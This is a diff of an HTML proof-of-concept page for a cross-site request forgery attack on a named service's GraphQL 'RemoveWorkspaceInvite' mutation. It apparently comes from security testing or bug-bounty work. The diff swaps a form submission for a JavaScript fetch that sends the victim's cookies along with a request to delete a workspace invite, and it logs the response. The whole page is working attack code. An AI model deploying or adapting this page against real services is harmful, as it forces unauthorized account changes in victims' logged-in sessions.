@@ -2,19 +2,44 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CSRF PoC – RemoveWorkspaceInvite</title>
+  <title>CSRF PoC – RemoveWorkspaceInvite (Fetch)</title>
 </head>
 <body>
-  <h2>CSRF PoC – Remove Workspace Invite</h2>
+  <h2>CSRF PoC – Remove Workspace Invite (Fetch)</h2>
+  <button onclick="launchAttack()">Send CSRF via Fetch</button>
 
-  <form action="https://app.segment.com/gateway-api/graphql?operation=RemoveWorkspaceInvite"
-        method="POST" target="_blank">
-    <textarea name="payload" style="width:100%;height:120px;">
-operationName=RemoveWorkspaceInvite&variables={"input":{"workspaceSlug":"admin-test-1a07","email":"admin@segment.com"}}&query=mutation RemoveWorkspaceInvite($input: DeleteInviteInput!) { deleteInvite(input: $input) { deleted __typename } }
-    </textarea>
-    <br>
-    <button type="submit">Submit CSRF Request</button>
-  </form>
+  <script>
+    async function launchAttack() {
+      const url = "https://app.segment.com/gateway-api/graphql?operation=RemoveWorkspaceInvite";
 
+      const bodyData = {
+        "operationName": "RemoveWorkspaceInvite",
+        "variables": {
+          "input": {
+            "workspaceSlug": "admin-test-1a07",
+            "email": "admin@segment.com"
+          }
+        },
+        "query": "mutation RemoveWorkspaceInvite($input: DeleteInviteInput!) {\n  deleteInvite(input: $input) {\n    deleted\n    __typename\n  }\n}\n"
+      };
+
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          credentials: "include", // send cookies with request
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(bodyData)
+        });
+
+        console.log("Status:", res.status);
+        const text = await res.text();
+        console.log("Response:", text);
+        alert("Request sent. Check console for response.");
+      } catch (e) {
+        console.error("Fetch blocked:", e);
+        alert("Fetch blocked by CORS (likely safe).");
+      }
+    }
+  </script>
 </body>
 </html>
